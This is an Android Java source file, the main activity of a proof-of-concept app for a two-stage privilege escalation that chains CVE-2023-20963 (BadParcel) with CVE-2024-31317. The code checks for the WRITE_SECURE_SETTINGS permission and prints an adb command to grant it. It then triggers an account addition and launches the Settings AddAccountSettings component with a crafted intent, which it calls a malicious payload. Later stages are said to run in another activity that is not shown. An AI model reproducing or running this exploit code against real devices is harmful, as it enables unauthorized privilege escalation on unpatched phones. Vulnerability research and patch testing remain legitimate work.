package com.example.tzpoc;

import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final String TAG = "BadParcel";
    private static StringBuilder logBuilder = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        appendLog("========================================");
        appendLog(" CVE-2023-20963 + CVE-2024-31317 PoC");
        appendLog(" Two-Stage Privilege Escalation");
        appendLog("========================================");

        // 権限確認
        appendLog("[*] Checking WRITE_SECURE_SETTINGS permission...");
        try {
            Settings.Global.putString(getContentResolver(), "test_permission", "dummy");
            appendLog("[+] WRITE_SECURE_SETTINGS is granted (or test succeeded)");
        } catch (Exception e) {
            appendLog("[-] WRITE_SECURE_SETTINGS NOT granted: " + e.getMessage());
            appendLog("[!] Please run: adb shell pm grant com.example.tzpoc android.permission.WRITE_SECURE_SETTINGS");
        }

        // ステージ1: BadParcel をトリガー
        appendLog("[*] Stage 1: Triggering BadParcel (CVE-2023-20963)...");
        triggerBadParcel();

        // ステージ2以降は ProofActivity で実行
        appendLog("[*] Stage 2-3 will be executed by ProofActivity if BadParcel succeeds");

        // 20秒後に終了
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            appendLog("[*] PoC finished. Check /sdcard/Download/ and /data/local/tmp/");
            saveLog();
            finish();
        }, 20000);
    }

    private void triggerBadParcel() {
        try {
            AccountManager am = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
            am.addAccount("com.example.tzpoc", null, null, null, this, null, null);
            appendLog("[+] addAccount triggered.");
        } catch (Exception e) {
            appendLog("[+] addAccount triggered (may already exist): " + e.getMessage());
        }

        Intent attacker = new Intent();
        attacker.setComponent(new ComponentName(
                "com.android.settings",
                "com.android.settings.accounts.AddAccountSettings"
        ));
        attacker.setAction(Intent.ACTION_RUN);
        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String[] authTypes = {getPackageName()};
        attacker.putExtra("account_types", authTypes);
        startActivity(attacker);
        appendLog("[+] AddAccountSettings launched with malicious payload.");
    }

    public static void appendLog(String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        Log.d(TAG, msg);
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) return;
            File file = new File(dir, "two_stage_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(file))) {
                pw.print(logBuilder.toString());
            }
            appendLog("[+] Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Save log failed: " + e.getMessage());
        }
    }
}
